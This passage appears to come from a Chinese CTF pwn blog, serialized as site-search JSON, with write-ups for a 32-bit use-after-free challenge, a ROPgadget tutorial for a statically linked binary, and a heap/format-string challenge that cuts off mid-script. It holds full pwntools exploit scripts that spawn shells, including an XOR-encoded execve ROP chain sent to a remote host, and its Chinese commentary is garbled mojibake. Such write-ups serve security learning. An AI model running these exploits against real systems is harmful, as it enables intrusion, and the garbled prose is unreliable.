*)malloc(8u);//chunkå¤§å°å›ºå®šä¸º0x8      if ( i )      &#123;        if ( i &lt;= 0 || i &gt; 9 )        &#123;          return puts(&quot;NO PAGE&quot;);        &#125;        else        &#123;          puts(&quot;Good cretation!&quot;);          return ++i;        &#125;      &#125;      else      &#123;        v2 = page;        *(_DWORD *)page = 1868654951;        v2[4] = 0;        *((_DWORD *)page + 1) = echo; //page + 1ä¸­çš„1æ˜¯æŒ‡1ä¸ªå­—é•¿ï¼Œå› ä¸ºæ˜¯32ä½ç¨‹åºï¼Œæ‰€ä»¥page + 1 = page + 4 bytes        puts(&quot;The init page&quot;);        return ++i;      &#125;    &#125;  &#125;  return result;&#125;\ncreatå‡½æ•°çš„é‡ç‚¹æœ‰ä¸‰å¤„ï¼š1.åˆ›å»ºchunkçš„æ—¶å€™é‡‡ç”¨çš„æ˜¯++iï¼Œä¸å…¶ä»–è¾“å…¥indexæ¥åˆ›å»ºçš„é¢˜æœ‰æ‰€ä¸åŒ2.èƒ½åˆ›å»ºchunk0ï¼Œå› ä¸ºâ€œif ( i &gt;&#x3D; 0 )â€3.æ³¨æ„æ³¨é‡Šä¸­çš„page + 1å¤„ï¼Œæ„æ€å°±æ˜¯pageåœ°å€çš„ä¸‹ä¸€ä¸ªå­—é•¿çš„å†…å®¹æ›´æ”¹ä¸ºechoè¿™ä¸ªå‡½æ•°çœ‹çœ‹echo\nint __cdecl echo(char *s)&#123;  return puts(s);&#125;\nputsæ˜¯ä¸ªå¥½ä¸œè¥¿\nunsigned int edit()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0 || v1 &gt; i )  //æ³¨æ„è¿™é‡Œå¹¶ä¸èƒ½editåˆ°chunk0  &#123;    puts(&quot;NO PAGE&quot;);  &#125;  else  &#123;    puts(&quot;Input your strings&quot;);    __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\neditå‡½æ•°ï¼Œå°±æ˜¯è¾“å…¥ä½ è¦ç¼–è¾‘çš„chunkï¼Œç„¶åå†è¾“å…¥è¦æ›´æ”¹çš„å†…å®¹\nunsigned int show()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 )  &#123;    if ( v1 &lt;= 0 || v1 &gt; i )      puts(&quot;NO PAGE&quot;);    else      echo((&amp;page)[v1]);  &#125;  else  &#123;    (*((void (__cdecl **)(char *))page + 1))(page); //è¿™é‡Œä¹Ÿæ˜¯page + 4 bytes  &#125;  return __readgsdword(0x14u) ^ v2;&#125;  \nè¿™å¥ä»£ç çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿå…ˆæ‰§è¡ŒæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€çš„ä¸‹ä¸€ä¸ªå­—é•¿çš„æŒ‡ä»¤ æ¥ç€ç”¨æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€çš„å†…å®¹å½“ä½œå…ˆå‰æ‰§è¡Œçš„æŒ‡ä»¤çš„å‚æ•°æ‰€ä»¥å½“æˆ‘ä»¬ä¸å¯¹chunkå†…å®¹è¿›è¡Œä»»ä½•æº¢å‡ºæ—¶ï¼Œä»…ä»…åªæ˜¯è¾“å…¥å°äºä¸€ä¸ªå­—é•¿çš„æ•°æ®æ—¶showå‡½æ•°å°±ç›¸å½“äºè°ƒç”¨äº†echoå‡½æ•°æŠŠchunkçš„å†…å®¹putsäº†å‡ºæ¥\nunsigned int del()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt; 0 || v1 &gt; i )    puts(&quot;NO PAGE&quot;);  else    free((&amp;page)[v1]);  return __readgsdword(0x14u) ^ v2;&#125;\ndeleteå‡½æ•°ï¼Œè¿™é‡Œå°±è¦è®²è®²UAFçš„æˆå› äº†ä¾‹å¦‚æ­¤å¤„ï¼Œå‡è®¾å·²ç»ç”³è¯·äº†chunk0chunk0è¢«freeåï¼Œå…¶æŒ‡é’ˆå¹¶æ²¡æœ‰è¢«æ¸…ç©ºæ­¤æ—¶ç”³è¯·chunk1è€Œç”±äºæ¯ä¸€æ¬¡ç”³è¯·çš„chunkå¤§å°éƒ½æ˜¯0x8æ­¤æ—¶ç”³è¯·çš„page1å¤§å°å°äºç­‰äºpage0ç³»ç»Ÿå°±ä¼šæŠŠchunk0[å·²ç»è¢«freeï¼ŒæŒ‡é’ˆ(page0)å­˜å…¥fastbin]çš„ç©ºé—´å†æ¬¡åˆ†é…ç»™chunk1å³æ­¤æ—¶chunk0ä¸chunk1å…±äº«ç©ºé—´å› æ­¤å¯ä»¥å®ç°åˆ©ç”¨page1æ§åˆ¶chunk0å³UAFï¼ŒUse After Free\nè¿™é‡Œæœ‰ä¸ªå°é—®é¢˜ï¼Œæˆ‘ä½¿ç”¨Ubuntu 20.04è¿›è¡ŒåŠ¨è°ƒæ—¶page0ä¼šè¢«å­˜å…¥tcacheï¼Œä½†æ˜¯ä»ç„¶ä¼šè¢«å¤ç”¨ç­‰ç ”ç©¶tcacheçš„æ—¶å€™å†æ¥è¡¥å……\nå›åˆ°æœ¬é¢˜æ€è·¯NICOå‡½æ•°å¤„å­˜åœ¨ä¸€å¤„systemæˆ‘ä»¬ç”¨editå‡½æ•°ä¿®æ”¹chunk0çš„å†…å®¹ä¸º â€œsh\\x00\\x00â€ç„¶åæº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªå­—é•¿ ä¿®æ”¹å…¶å†…å®¹ä¸ºsystemçš„åœ°å€è¿™æ ·å½“æˆ‘ä»¬æ‰§è¡Œshowå‡½æ•°çš„æ—¶å€™ å…¶å°±ä¼šä½¿ç”¨chunkå†…çš„shå½“ä½œsystemå‡½æ•°çš„å‚æ•°æ‰§è¡Œsystem(â€˜shâ€™)ï¼Œæ‹¿åˆ°shell\nè¿™é‡Œå†è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆæ˜¯ â€˜sh\\x00\\x00â€™32ä½çš„ç¨‹åºä¸€ä¸ªå­—é•¿åªæœ‰4ä¸ªå­—èŠ‚ å¦‚æœæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯&#x2F;bin&#x2F;shæ˜¾ç„¶å­—èŠ‚ä¸å¤Ÿæ‰€ä»¥ä½¿ç”¨shä¹Ÿèƒ½è¾¾æˆå¯¹åº”çš„æ“ä½œ è‡³äºåé¢çš„ä¸¤ä¸ª\\x00 æ˜¯ä¸ºäº†å¡«å……å­—èŠ‚ åˆä¸è‡³äºç ´åshå­—ç¬¦ä¸²\nfrom pwn import *p = process(&#x27;./UAF&#x27;)#p = remote(&#x27;1.14.71.254&#x27;,28674)elf = ELF(&#x27;./UAF&#x27;)context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)NICO = 0x80484E0 def add_chunk():    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;1&#x27;)  def edit_chunk(index, string):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index))    p.recvuntil(b&#x27;strings\\n&#x27;)    p.sendline(string)  def del_chunk(index):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index))  def show_chunk(index):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index)) def debug():    gdb.attach()    pause(p)#debug() add_chunk()del_chunk(0)add_chunk()edit_chunk(1, b&#x27;sh\\x00\\x00&#x27; + p32(NICO)) show_chunk(0) p.interactive()","categories":["heap"],"tags":["UAF"]},{"title":"android_root","url":"/2024/12/03/android-root/","content":""},{"title":"ROPgadget","url":"/2023/08/10/ROPgadget/","content":"å®‰è£…\nsudo apt-get install python-capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo -H python3 setup.py install\nä¸€èˆ¬ä½¿ç”¨\nâ”Œâ”€â”€(str1d3rã‰¿str1k3Gwindows)-[~/Desktop]â””â”€$ ROPgadget --binary &lt;file &gt; |grep &quot;&lt;gadget&gt;&quot;\n\nç‰¹æ®Šæƒ…å†µç»™å‡ºä¸€ä¾‹é¢˜[CISCN 2019åå—]PWN8\nâ”Œâ”€â”€(str1d3rã‰¿str1k3Gwindows)-[~/Desktop/nssctf/[CISCN 2019åå—]PWN8]â””â”€$ python exp.py[+] Starting local process &#x27;./pwn&#x27;: pid 221[DEBUG] &#x27;/[CISCN 2019åå—]PWN8/pwn&#x27; is statically linked, skipping GOT/PLT symbols[*] &#x27;/[CISCN 2019åå—]PWN8/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nROPgadget --binary pwn --ropchain\né¢å¯¹é™æ€é“¾æ¥çš„é¢˜ï¼ŒROPgadgetå¯ä»¥è‡ªåŠ¨ç”Ÿæˆropé“¾\n#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x000000000044c156) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscall\nå†æ¥çœ‹çœ‹è¿™é“é¢˜è¿˜æœ‰ä»€ä¹ˆåˆ«çš„ï¼šmain\n__int64 sub_4005A0()&#123;  char v1[520]; // [rsp+0h] [rbp-208h] BYREF  sub_400BF0();  sub_410550(&quot;Please enter your Password: &quot;);  sub_449BE0(0, v1, 0x200uLL);  if ( (unsigned int)sub_400C40(v1) )    sub_410550(&quot;Correct!&quot;);  else    sub_410550(&quot;Wrong!&quot;);  return 0LL;&#125;\nprintf\n__int64 __fastcall sub_410550(__int64 a1)&#123;  __int64 v2; // rax  _QWORD *v3; // rbp  __int64 v4; // rbx  _DWORD *v5; // rdi  int v6; // eax  unsigned __int64 v8; // r8  bool v10; // zf  int v11; // eax  __int64 v12; // r13  _BYTE *v13; // rax  unsigned __int64 v14; // rbx  __int64 v15; // rdx  v2 = sub_4004C0();  v3 = off_6BA7A0;  v4 = v2;  v5 = off_6BA7A0;  if ( (*(_DWORD *)off_6BA7A0 &amp; 0x8000) == 0 )  &#123;    _RDX = *((_QWORD *)off_6BA7A0 + 17);    v8 = __readfsqword(0x10u);    if ( *(_QWORD *)(_RDX + 8) == v8 )    &#123;LABEL_9:      ++*(_DWORD *)(_RDX + 4);      goto LABEL_10;    &#125;    _ESI = 1;    v10 = dword_6BD80C == 0;    if ( dword_6BD80C )    &#123;      v6 = *(_DWORD *)off_6BA7A0 &amp; 0x8000;      if ( v6 == _InterlockedCompareExchange((volatile signed __int32 *)_RDX, 1, v6) )        goto LABEL_8;    &#125;    else    &#123;      __asm &#123; cmpxchg [rdx], esi &#125;      if ( v10 )      &#123;LABEL_8:        _RDX = v3[17];        v5 = off_6BA7A0;        *(_QWORD *)(_RDX + 8) = v8;        goto LABEL_9;      &#125;    &#125;    sub_44C130(_RDX, 1LL);    goto LABEL_8;  &#125;LABEL_10:  v11 = v5[48];  if ( v11 )  &#123;    if ( v11 != -1 )      goto LABEL_28;  &#125;  else  &#123;    v5[48] = -1;  &#125;  v12 = *((_QWORD *)v5 + 27);  if ( (char *)&amp;off_6BC2C8 - (char *)&amp;unk_6BBC20 &lt;= (unsigned __int64)(v12 - (_QWORD)&amp;unk_6BBC20) )  &#123;    sub_412C50();    v5 = off_6BA7A0;  &#125;  if ( v4 != (*(__int64 (__fastcall **)(_DWORD *, __int64, __int64))(v12 + 56))(v5, a1, v4) )    goto LABEL_28;  v13 = (_BYTE *)*((_QWORD *)off_6BA7A0 + 5);  if ( (unsigned __int64)v13 &lt; *((_QWORD *)off_6BA7A0 + 6) )  &#123;    *((_QWORD *)off_6BA7A0 + 5) = v13 + 1;    *v13 = 10;    goto LABEL_17;  &#125;  if ( (unsigned int)sub_416970(off_6BA7A0, 10LL) == -1 )  &#123;LABEL_28:    LODWORD(v14) = -1;    goto LABEL_19;  &#125;LABEL_17:  v14 = v4 + 1;  if ( v14 &gt; 0x7FFFFFFF )    LODWORD(v14) = 0x7FFFFFFF;LABEL_19:  if ( (*(_DWORD *)v3 &amp; 0x8000) == 0 )  &#123;    v15 = v3[17];    v10 = (*(_DWORD *)(v15 + 4))-- == 1;    if ( v10 )    &#123;      *(_QWORD *)(v15 + 8) = 0LL;      if ( dword_6BD80C )      &#123;        if ( !_InterlockedDecrement((volatile signed __int32 *)v15) )          return (unsigned int)v14;        goto LABEL_25;      &#125;      v10 = (*(_DWORD *)v15)-- == 1;      if ( !v10 )LABEL_25:        sub_44C160(v15);    &#125;  &#125;  return (unsigned int)v14;&#125;\nread\nunsigned __int64 __fastcall sub_449BE0(unsigned int fd, char *buf, size_t count)&#123;  unsigned __int64 result; // rax  unsigned __int64 v5; // rax  unsigned int v6; // r8d  unsigned __int64 v7; // [rsp+0h] [rbp-20h]  if ( dword_6BD80C )  &#123;    sub_44C180();    v5 = sys_read(fd, buf, count);    if ( v5 &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      __writefsdword(0xFFFFFFC0, -(int)v5);      v5 = -1LL;    &#125;    v7 = v5;    sub_44C1E0(v6);    return v7;  &#125;  else  &#123;    result = sys_read(fd, buf, count);    if ( result &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      __writefsdword(0xFFFFFFC0, -(int)result);      return -1LL;    &#125;  &#125;  return result;&#125;\nè¿™ä¸ªå‡½æ•°ä¼šæŠŠä¼ å…¥çš„å‚æ•°è¿›è¡Œå¼‚æˆ–ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆæŠŠå…ˆå‰ç”Ÿæˆçš„ropé“¾å¼‚æˆ–å†ä¼ å…¥,é¡ºä¾¿ç¼©çŸ­ä¸€ä¸‹ropchain\n_BOOL8 __fastcall sub_400C40(const char *a1)&#123;  char *v1; // rbp  int v2; // edx  unsigned int v3; // eax  __int64 v4; // rbp  __int64 v5; // r12  char *v6; // rax  char *v7; // rdx  _BOOL8 result; // rax  char v9; // [rsp+8h] [rbp-50h] BYREF  _BYTE v10[7]; // [rsp+9h] [rbp-4Fh] BYREF  char v11[72]; // [rsp+10h] [rbp-48h] BYREF  v1 = strcpy(&amp;v9, a1);  do  &#123;    v2 = *(_DWORD *)v1;    v1 += 4;    v3 = ~v2 &amp; (v2 - 16843009) &amp; 0x80808080;  &#125;  while ( !v3 );  if ( (~v2 &amp; (v2 - 16843009) &amp; 0x8080) == 0 )    v3 &gt;&gt;= 16;  if ( (~v2 &amp; (v2 - 16843009) &amp; 0x8080) == 0 )    v1 += 2;  v4 = &amp;v1[-__CFADD__((_BYTE)v3, (_BYTE)v3) - 3] - &amp;v9;  v5 = sub_4102B0(&quot;pass_enc.txt&quot;, &amp;unk_4A593F);  if ( (__int16)v4 &gt; 0 )  &#123;    v6 = v10;    v7 = &amp;v9;    while ( 1 )    &#123;      *v7 ^= 0x66u; //è¿™é‡Œæœ‰ä¸ªå¼‚æˆ–      v7 = v6;      if ( v6 == &amp;v10[(__int16)v4 - 1] )        break;      ++v6;    &#125;  &#125;  result = 0LL;  if ( v5 )  &#123;    sub_4103D0(v11, 40LL, 1LL, v5);    sub_40FD50(v5);    return (unsigned int)sub_400498(v11, &amp;v9) == 0;  &#125;  return result;&#125;\nexp:\nfrom ctypes import *from pwn import *#io = process(&#x27;./pwn&#x27;)io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28324)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)elf = ELF(&#x27;./pwn&#x27;)from struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += p64(59)p += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscallep = b&#x27;&#x27;for i in range(len(p)):        ep += p8(ord(p[i:i+1]) ^ 0x66)    payload = b&#x27;a&#x27;*0x50 + epio.sendafter(b&#x27;Password: \\n&#x27;, payload)io.interactive()","categories":["stack"],"tags":["shellcode"]},{"title":"BlueHatCup_semi_pwns","url":"/2023/09/17/blue-cup-pwns/","content":"å¯¹å¤§ä½¬æ¥è¯´å¾ˆç®€å•ï¼Œå¯¹æˆ‘è¿™ç§èœçŒ«æ¥è¯´åˆšåˆšå¥½UAFchecksec\nâ””â”€# checksec main[*] &#x27;/mnt/attachment/main&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled\nè¿›å…¥debugmodeå‰å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„éœ²stack\nvoid __noreturn sub_1336()&#123;  void *v0; // [rsp+0h] [rbp-20h] BYREF  const void *buf; // [rsp+8h] [rbp-18h] BYREF  char s[8]; // [rsp+14h] [rbp-Ch] BYREF  int v3; // [rsp+1Ch] [rbp-4h]  puts(&quot;Tell me ur name: &quot;);  memset(s, 0, sizeof(s));  read(0, s, 8uLL);  printf(s);  puts(&quot;DEBUG MODE ON&quot;);  puts(&quot;1. READ&quot;);  puts(&quot;2. WRITE&quot;);  puts(&quot;&gt;&gt; &quot;);  v3 = sub_12F0();  if ( v3 == 1 )  &#123;    puts(&quot;READ MODE: &quot;);    read(0, &amp;buf, 8uLL);    write(0, buf, 8uLL);  &#125;  if ( v3 == 2 )  &#123;    puts(&quot;WRITE MODE: &quot;);    read(0, &amp;v0, 8uLL);    read(0, v0, 8uLL);  &#125;  exit(0);&#125;\næœ‰ä¸¤ç§æ–¹æ³•è¿›å…¥debugï¼Œcase4,å½“æ²¡æœ‰åˆå§‹åŒ–å †æ—¶èƒ½è¿›å…¥\nif ( !v3 )  &#123;    puts(&quot;Nothing to show&quot;);    puts(&quot;May be need to check?&quot;);    sub_1336();  &#125;\n\ncase5ï¼Œloginä¸ºadmin\nint sub_1836()&#123;  char s[16]; // [rsp+0h] [rbp-10h] BYREF  memset(s, 0, sizeof(s));  puts(&quot;Passwd: &quot;);  read(0, s, 0x10uLL);  if ( !strcmp(s, s2) )  &#123;    puts(&quot;Login Success!&quot;);    sub_1336();  &#125;  return puts(&quot;Login Failed!&quot;);&#125;\nå¯†ç åœ¨è¿™\n.data:0000000000004010 31 32 33 34 35 36 37 38 39 30+s2 db &#x27;1234567890&#x27;,0 \n\næ¥ä¸‹æ¥çœ‹å †éƒ¨åˆ†addæ²¡æœ‰å¯¹chunkå¤§å°è¿›è¡Œé™åˆ¶é™åˆ¶äº†16ä¸ªchunk\nint sub_14B9()&#123;  int result; // eax  char s[512]; // [rsp+0h] [rbp-210h] BYREF  void *dest; // [rsp+200h] [rbp-10h]  int v3; // [rsp+208h] [rbp-8h]  int i; // [rsp+20Ch] [rbp-4h]  for ( i = 0; i &lt;= 16 &amp;&amp; qword_40A0[i]; ++i )    ;  if ( i == 16 )    return puts(&quot;No Space!&quot;);  puts(&quot;Tell me the book content size: &quot;);  v3 = sub_12F0();  memset(s, 0, sizeof(s));  puts(&quot;Tell me the book content: &quot;);  read(0, s, v3);  dest = malloc(v3);  memcpy(dest, s, v3);  qword_40A0[i] = dest;  result = v3;  dword_4060[i] = v3;  return result;&#125;\ndeleteæ²¡æœ‰ç½®ç©ºæŒ‡é’ˆå­˜åœ¨uafï¼Œä½†æ˜¯æ˜¯glibc2.31ï¼Œdoublefreeéœ€è¦æ”¹keyä½†æ˜¯å¯ä»¥unsortedæ³„éœ²libc\n&#123;  _DWORD *v0; // rax  unsigned int v2; // [rsp+Ch] [rbp-4h]  puts(&quot;Tell me the book index: &quot;);  v2 = sub_12F0();  if ( qword_40A0[v2] &amp;&amp; v2 &lt;= 0xF )  &#123;    free((void *)qword_40A0[v2]);    v0 = dword_4060;    dword_4060[v2] = 0;  &#125;  else  &#123;    LODWORD(v0) = puts(&quot;Invalid!&quot;);  &#125;  return (int)v0;&#125;\nå¯ä»¥é€šè¿‡unsortedbinæ¥æ³„éœ²libc\ndebugmodeæœ€åæœ‰ä¸ªexit,è€ƒè™‘æ‰“exithook\nfrom pwn import *p = remote(&#x27;120.78.172.238&#x27;,49149)#p = process(&#x27;./main&#x27;)elf = ELF(&quot;./main&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;Tell me the book content size:&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;Tell me the book content:&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;Tell me the book index:&#x27;)    p.sendline(str(index))def edit(index,payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Tell me the book index:&quot;)    p.sendline(str(index))    p.sendlineafter(b&quot;Tell me the book content:&quot;,payload)def check():    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)def login():    p.sendlineafter(b&#x27;&gt;&gt; \\n&#x27;, b&#x27;5&#x27;)    p.sendlineafter(b&#x27;Passwd: 